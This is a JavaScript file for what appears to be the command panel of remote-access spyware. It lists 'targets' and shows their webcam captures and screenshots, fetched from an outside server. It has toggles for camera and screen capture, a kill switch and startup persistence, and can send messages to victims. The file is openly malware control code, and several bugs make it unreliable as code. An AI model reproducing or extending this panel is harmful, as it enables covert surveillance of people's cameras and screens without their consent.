const key = Qs.parse(location.search, {
    ignoreQueryPrefix: true,
}).key;

const content = document.getElementById("content");
const dom_tags = {
    img: '<img class="img_class"',
    lable: "<lable ",
    close_lable: "</lable>",
    button: "<button ",
    close_button: "</button>",
    br: "<br>",
    hr: "<hr>"
}

var currentData = [];

async function run() {
    const r = await fetch(`/info/${key}`);
    const info = await r.json();
    currentData = info;
    console.log(info);
    var to_add = "";
    info.forEach(element => {
        to_add += `
            <div id="${element.id}_div">
            <img id = "${element.id}_img_cam" src = "https://vedant-test.glitch.me/images/cam_${element.name}.jpeg/${key}">     
            <img id = "${element.id}_img_ss" src = "https://vedant-test.glitch.me/images/ss_${element.name}.jpeg/${key}"><br>
            <lable id="${element.id}_id">id : ${element.id}</lable><br>
            <lable id="${element.id}_name">name : ${element.name}</lable><br>
            <lable id="${element.id}_status_g">connection : ${element.status_g}</lable><br>
            <lable id="${element.id}_cam">camera capture : ${element.enable_cam}</lable>
            <button type="button" onclick="toggleAttr(${element.id},'enable_cam')">toggle</button><br>
            <lable id="${element.id}_ss">ss capture : ${element.enable_ss}</lable>
            <button type="button" onclick="toggleAttr(${element.id},'enable_ss')">toggle</button><br>
            <lable id="${element.id}_kill">kill : ${element.kill}</lable>
            <button type="button" onclick="toggleAttr(${element.id},'kill')">toggle</button><br>
            <lable id="${element.id}_startup">start up : ${element.start_up}</lable>
            <button type="button" onclick="toggleAttr(${element.id},'startup')">toggle</button><br>
            <input type="text" id="${element.id}_msg">
            <button type="button" onclick="sendMessage(${element.id})">send to target -> ${element.name}</button><br>
            </div><hr>
        `;
    });
    content.innerHTML = to_add;
    setInterval(updateInfo, 1000);
}

async function updateInfo() {
    const r = await fetch(`/info/${key}`);
    const info = await r.json();
    currentData = info;

    info.forEach(element => {
        changeImage(element.id);
        // document.getElementById(`${element.id}_name`).innerHTML = `name : ${element.name}`;
        document.getElementById(`${element.id}_cam`).innerHTML = `camera capture : ${element.enable_cam}`;
        document.getElementById(`${element.id}_ss`).innerHTML = `ss capture : ${element.enable_ss}`
        document.getElementById(`${element.id}_status_g`).innerHTML = `connection : ${element.status_g}`;
        document.getElementById(`${element.id}_start_up`).innerHTML = `start_up : ${element.startup}`;
        document.getElementById(`${element.id}_kill`).innerHTML = `kill : ${element.kill}`;
    })
}

async function toggleAttr(id, attr) {
    var update_to = "";
    currentData.forEach(element => {
        if (element.id = id && element[attr] == "true") {
            update_to = "false";
        } else {
            update_to = "true";
        }
    })

    fetch(`/set_status/${name}/${attr}/${update_to}/${key}`);
}

async function  sendMessage(id, msg){
    const options = {
        method: "POST",
        headers: {'Content-Type' : 'application/json'},
        body: JSON.stringify({info: msg})
    };
    fetch(`/send_message/${id}/${key}`, options)
}

async function changeImage(id) {
    console.log("changing");
    const filepath = id + ".jpeg";
    var request = new Request(`https://vedant-test.glitch.me/images/${filepath}/${key}`);
    fetch(request).then(response => {
        response.arrayBuffer().then(buffer => {
            var base64Flag = "data:image/jpeg;base64,";
            var imageStr = arrayBufferToBase64(buffer);
            var doms = document.querySelectorAll(".img_class");
            doms.forEach(element => {
                if (element.id == `i_${id}`) {
                    element.src = base64Flag + imageStr;
                }
            })
        });
    });
}
function arrayBufferToBase64(buffer) {
    var binary = "";
    var bytes = [].slice.call(new Uint8Array(buffer));

    bytes.forEach(b => (binary += String.fromCharCode(b)));

    return window.btoa(binary);
}

async function sendMessage() {

}